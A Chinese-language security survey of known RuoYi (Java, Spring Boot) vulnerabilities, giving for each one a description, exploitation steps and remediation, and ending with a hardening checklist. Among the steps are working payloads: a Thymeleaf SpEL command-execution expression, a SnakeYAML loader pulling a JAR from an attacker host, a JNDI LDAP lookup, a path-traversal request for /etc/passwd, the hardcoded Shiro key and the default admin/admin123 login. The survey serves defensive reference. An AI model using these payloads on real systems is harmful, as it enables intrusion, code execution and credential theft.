前言

若依（RuoYi）是国内使用最广泛的开源 Java 快速开发平台之一，基于 Spring Boot + MyBatis 构建，GitHub/Gitee 星标数万。正因其广泛使用，若依框架也成为了攻防演练和渗透测试中的高频目标。本文系统梳理若依单体版（非微服务版本）从 v4.5.x 到最新 v4.8.2+ 的全部已知安全漏洞，涵盖反序列化 RCE、模板注入、SQL 注入、任意文件下载、权限提升、未授权访问等多个维度，供安全研究人员和开发者参考。

声明：本文仅用于安全研究和防御加固参考，请勿将相关信息用于非法用途。所有漏洞信息均来自公开渠道。

1. 远程代码执行（RCE）漏洞[ 严重 ]

1. Apache Shiro 默认密钥反序列化 RCE

CVE 编号 CVE-2016-4437（关联）
影响版本 < v4.6.2
漏洞类型 反序列化/RCE
危害等级 严重

漏洞描述

若依早期版本使用固定 Shiro 加密密钥 fCq+/xW488hMTCD+cmJ3aQ==（AES-CBC），攻击者可利用已知密钥构造恶意 RememberMe Cookie，触发 Java 反序列化攻击，实现未授权远程代码执行。

利用方式

  1. 识别目标使用若依且版本 < 4.6.2（响应头含 rememberMe=deleteMe）

  2. 使用已知 Shiro 密钥加密恶意序列化对象

  3. 将 payload 设置到 Cookie 的 rememberMe 字段

  4. 服务端解密反序列化触发 RCE，可使用 ShiroExploit 等工具一键利用

修复建议

升级到 RuoYi >= 4.6.2（使用随机密钥）；检查 ShiroConfig.java 中是否仍包含固定密钥；升级 Shiro 组件至最新版本。

2. Thymeleaf SSTI 模板注入（可获取 Shiro 密钥+RCE）

CVE 编号 无公开 CVE
影响版本 <= v4.8.1
漏洞类型 SSTI/RCE
危害等级 严重

漏洞描述

若依使用 Thymeleaf 作为模板引擎，/monitor/cache/getNames 等接口中存在可控 fragment 参数，且未加 @ResponseBody 注解，Thymeleaf 引擎会解析传入的模板表达式（SpEL），可执行任意代码。典型利用是先通过 SSTI 读取 Shiro 密钥，再链接 Shiro 反序列化实现完整 RCE。

利用方式

  1. 访问存在漏洞的缓存监控相关接口

  2. 在 fragment 参数中注入 Thymeleaf 表达式，如 ${T(java.lang.Runtime).getRuntime().exec(‘whoami’)}::.x

  3. 服务端解析表达式执行任意命令

  4. 高版本 JDK16+ 环境需使用特殊绕过技巧

修复建议

升级到官方修复版本；对 controller 方法添加 @ResponseBody 注解防止模板解析；对输入进行严格过滤。

3. 定时任务 SnakeYAML 反序列化 RCE

CVE 编号 无公开 CVE
影响版本 < v4.7.6
漏洞类型 反序列化/RCE
危害等级 严重

漏洞描述

若依定时任务模块允许通过 invokeTarget 指定类的全路径进行调用。攻击者可构造 SnakeYAML 反序列化 payload 作为调用目标，触发远程代码执行。低版本无任何校验可直接利用，中间版本可通过空格和单引号绕过黑名单。

利用方式

  1. 登录后台 → 定时任务管理

  2. 创建新任务，invokeTarget 填入 org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“http://attacker/evil.jar”]]]]’)

  3. 执行任务触发反序列化，加载远程恶意 JAR 实现 RCE

  4. 高版本可通过 SQL 注入间接修改 sys_job 表绕过前端校验

修复建议

升级 SnakeYAML 到安全版本；对 invokeTarget 实施严格白名单校验；禁止调用危险类和方法；移除类全路径实例化执行逻辑。

4. 定时任务 JNDI 注入 RCE

CVE 编号 无公开 CVE
影响版本 < v4.7.6
漏洞类型 JNDI注入/RCE
危害等级 严重

漏洞描述

利用定时任务类路径实例化功能，构造 javax.naming.InitialContext.lookup(’ldap://attacker’) 类型的 JNDI 调用，指向攻击者控制的 LDAP/RMI 服务，加载并执行远程恶意类。

利用方式

  1. 编译恶意 Exploit 类并托管于 HTTP 服务

  2. 使用 marshalsec 启动 LDAP 引用服务

  3. 修改定时任务调用目标为 JNDI lookup 载荷

  4. 触发执行后获取反弹 Shell

修复建议

禁用类路径调用方式；升级 JDK 至高版本（>= 8u191，默认禁止远程 Reference 工厂类加载）；升级到若依修复版本。

5. 定时任务 SQL 注入绕过白名单致 RCE

CVE 编号 无公开 CVE
影响版本 v4.7.8 及附近版本
漏洞类型 SQL注入+RCE
危害等级 严重

漏洞描述

v4.7.7 后若依对定时任务可调用类实施了黑白名单限制，但 genTableServiceImpl 的 mapper 直接执行 ${sql} 表达式。攻击者通过定时任务调用 genTableServiceImpl.createTable() 执行 UPDATE 语句修改 sys_job 表中的 invoke_target 字段，用十六进制编码绕过黑白名单限制实现 RCE。

利用方式

  1. 创建定时任务，调用目标设为 genTableServiceImpl.createTable(‘UPDATE sys_job SET invoke_target=0x[hex_payload] WHERE …’)

  2. 恶意载荷用十六进制编码绕过过滤

  3. 执行完 UPDATE 后，再执行被修改的任务即触发 RCE

修复建议

对 genTableServiceImpl.createTable 进行严格 SQL 白名单校验（仅允许 CREATE TABLE）；禁止 mapper 中 ${sql} 直接拼接。

6. Quartz 定时任务代码注入 RCE

CVE 编号 CVE-2026-4564
影响版本 <= v4.8.2
漏洞类型 代码注入/RCE
危害等级 严重

漏洞描述

RuoYi 4.8.2 及以下版本 Quartz Job 定时任务模块 /monitor/job/ 中，远程攻击者在获取后台管理权限后，可通过构造恶意 invokeTarget 字符串利用 Java 反射机制执行任意代码。

利用方式

  1. 获取后台管理权限

  2. 在定时任务管理中构造恶意 invokeTarget 字符串

  3. 利用 Java 反射机制绕过安全限制执行任意代码

修复建议

升级到官方最新修复版本；对 invokeTarget 参数实施更严格的安全校验。

2. SQL 注入漏洞 [ 高危 ]

7. 认证用户 SQL 注入（createTable 接口）

CVE 编号 CVE-2024-57521
影响版本 <= v4.7.9
漏洞类型 SQL注入
危害等级 高危

漏洞描述

漏洞位于代码生成功能的 /tool/gen/createTable 接口，接收用户传入的 sql 参数并通过 SqlUtil.filterKeyword(sql) 过滤。但正则表达式未能有效拦截特定字符，攻击者可绕过过滤执行任意 SQL。

利用方式

  1. 已登录用户向 /tool/gen/createTable 提交构造的 sql 参数

  2. 借助 CREATE TABLE … AS SELECT … 语法结合条件报错逻辑

  3. 使用 IF(…, 1, 1/0) 对数据库信息逐字符枚举

修复建议

升级至最新版本；对 createTable 接口的 SQL 输入使用参数化处理；加强正则过滤规则，用白名单替代黑名单。

8. SQL 注入黑名单绕过

CVE 编号 CVE-2024-42913
影响版本 <= v4.7.9
漏洞类型 SQL注入
危害等级 高危

漏洞描述

若依对 SQL 注入实施了关键字黑名单防护，但攻击者可通过特殊编码或语法变换绕过黑名单检测，实现 SQL 注入攻击。

利用方式

  1. 分析若依 SQL 关键字黑名单过滤逻辑

  2. 使用特殊编码、大小写混合、注释符等方式绕过

  3. 通过绕过后的 SQL 注入语句获取数据库信息

修复建议

采用参数化查询替代黑名单过滤；升级到修复版本；使用 WAF 进行深层 SQL 注入防护。

9. 后台分页参数 SQL 注入（orderByColumn）

CVE 编号 无统一 CVE
影响版本 多版本（含 v4.8.1）
漏洞类型 SQL注入
危害等级 高危

漏洞描述

若依使用 MyBatis 进行数据库操作，部分接口（如 /system/user/list）的分页排序参数 orderByColumn 使用 ${} 进行动态 SQL 拼接而非参数化查询 #{}，导致 SQL 注入。v4.8.1 中仍可通过三级嵌套 CASE WHEN 绕过正则白名单。

利用方式

在后台功能请求中修改 orderByColumn 参数，注入恶意 SQL 表达式，通过时间盲注或联合查询实现数据窃取。

修复建议

将所有 ${} 动态拼接改为 #{} 参数化查询；对排序字段进行严格白名单校验。

3. 文件操作漏洞 [ 高危 ]

10. 任意文件下载漏洞

CVE 编号 CVE-2023-27025
影响版本 <= v4.7.6
漏洞类型 路径穿越/文件下载
危害等级 高危

漏洞描述

文件下载接口 /common/download/resource 对文件路径校验不严格，攻击者可通过 ../ 目录穿越访问服务器上的任意文件，包括配置文件（含数据库密码）、源代码等敏感信息。

利用方式

  1. 构造路径穿越请求：/common/download/resource?resource=/profile/../../../../etc/passwd

  2. 绕过文件路径白名单限制

  3. 下载 application.yml（含数据库密码）等敏感文件

修复建议

升级到 RuoYi >= 4.7.7；对文件下载路径进行严格白名单限制和规范化处理；禁止 ../ 等目录穿越字符。

4. 权限提升与安全绕过 [ 高危 ]

11. 权限提升漏洞（jobLogId 参数）

CVE 编号 CVE-2025-28406
影响版本 v4.8.0
漏洞类型 权限提升
危害等级 高危

漏洞描述

远程攻击者可利用 jobLogId 参数实现权限提升，组件白名单的 getBeanName 函数存在缺陷，低权限用户可越权访问或操作本不可见的定时任务日志/资源。

利用方式

通过构造包含特定 jobLogId 参数的请求，越权访问或操作高权限资源。

修复建议

升级到 RuoYi > v4.8.0；对 getBeanName 函数增加严格的权限校验。

12. 白名单 getBeanName 函数绕过

CVE 编号 CVE-2025-0734
影响版本 v4.8.0
漏洞类型 安全绕过
危害等级 高危

漏洞描述

若依 4.8.0 白名单组件中 getBeanName 函数存在安全缺陷，攻击者可绕过白名单限制执行未授权操作。

利用方式

通过构造特殊请求绕过白名单检查机制，执行未授权的 Bean 调用。

修复建议

升级至官方修复版本；加强白名单校验逻辑。

13. 权限提升漏洞

CVE 编号 CVE-2025-56396
影响版本 <= v4.8.1
漏洞类型 权限提升
危害等级 严重

漏洞描述

RuoYi 4.8.1 版本存在权限提升漏洞，低权限攻击者可利用该漏洞通过特定请求提升至管理员权限，获得更高的系统权限。

利用方式

低权限攻击者通过特定请求构造，提升至管理员权限。

修复建议

升级到修复后版本，加强后端权限校验逻辑。

5. 认证与配置缺陷 [ 中危~高危 ]

14. 默认弱口令 admin/admin123

CVE 编号 无
影响版本 所有版本
漏洞类型 默认凭据
危害等级 高危

漏洞描述

若依系统默认管理员账户使用弱口令 admin/admin123，大量部署实例未修改默认密码，攻击者无需破解即可直接获得后台管理权限，进而利用后台定时任务等功能深入攻击。

利用方式

直接使用 admin/admin123 登录后台管理系统，获取所有管理权限。

修复建议

部署后立即修改所有默认密码；强制密码复杂度策略（至少12位）；启用登录失败锁定；集成 OAuth2 或多因素认证。

15. Druid 监控页面未授权访问

CVE 编号 无
影响版本 多版本（配置相关）
漏洞类型 未授权访问/信息泄露
危害等级 中危

漏洞描述

若依默认集成 Druid 数据源监控，部分版本/配置下未对 Druid 监控页面进行鉴权保护，可查看 SQL 执行记录、数据源信息、Session 信息等敏感数据。

利用方式

直接访问 /druid/index.html，获取 SQL 执行记录、数据源配置、Session 等信息。

修复建议

在 ShiroConfig 或 Spring Security 配置中对 /druid/** 路径添加认证拦截；或在 Druid 配置中启用登录认证。

16. Swagger 接口文档未授权访问

CVE 编号 无
影响版本 多版本（配置相关）
漏洞类型 未授权访问/信息泄露
危害等级 中危

漏洞描述

若依集成 Swagger API 文档，未做访问控制时可被外部访问，获取全部 API 接口定义，辅助进一步攻击。

利用方式

访问 /swagger-ui.html 或 /swagger-resources 等路径，获取全部 API 接口定义。

修复建议

生产环境禁用 Swagger，或为 Swagger 路径添加认证要求。

17. 多个安全漏洞（v4.8.0 集中披露）

CVE 编号 CVE-2024-57436 ~ 57439
影响版本 v4.8.0
漏洞类型 信息泄露/安全缺陷
危害等级 中危

漏洞描述

4.8.0 版本同时披露了四个 CVE，其中 CVE-2024-57439 允许未经授权的攻击者在系统监控中查看 admin 的会话 ID，可能导致会话劫持。其余 CVE 涉及类似的安全缺陷和信息泄露问题。

利用方式

通过系统监控接口查看 admin 会话 ID，可能进行会话劫持等攻击。

修复建议

升级到 RuoYi > v4.8.0 的修复版本。

通用安全加固建议

序号 措施 说明
1 及时升级版本 始终使用若依最新稳定版本，关注官方 Gitee/GitHub 仓库的安全更新公告，第一时间应用安全补丁。
2 修改默认配置 部署时必须修改默认管理员密码（admin/admin123）、替换 Shiro 加密密钥为随机生成的高强度密钥、关闭不必要的调试组件。
3 参数化查询 所有 SQL 操作使用 #{} 参数化方式，全面排查和替换 ${} 字符串拼接。特别关注 orderByColumn、dataScope 等动态排序/过滤参数。
4 定时任务安全加固 对 invokeTarget 采用严格白名单策略，仅允许调用预定义的安全 Bean 方法；彻底移除类全路径实例化执行逻辑。
5 生产环境加固 删除代码生成模块（ruoyi-generator）；禁用 Druid 监控页面的公开访问；关闭 Swagger 文档；关闭 Actuator 非必要端点。
6 文件操作安全 文件下载/读取接口实施严格路径白名单，禁止目录穿越；对所有文件操作接口的路径参数进行规范化处理。
7 JDK 版本升级 使用高版本 JDK（>= 8u191）以缓解 JNDI 注入风险。高版本默认禁止远程 Reference 工厂类加载。
8 网络层防护 部署 WAF 对 SQL 注入、反序列化、SSTI 等攻击进行拦截；运行若依的系统用户应使用最小权限，避免以 root 运行。
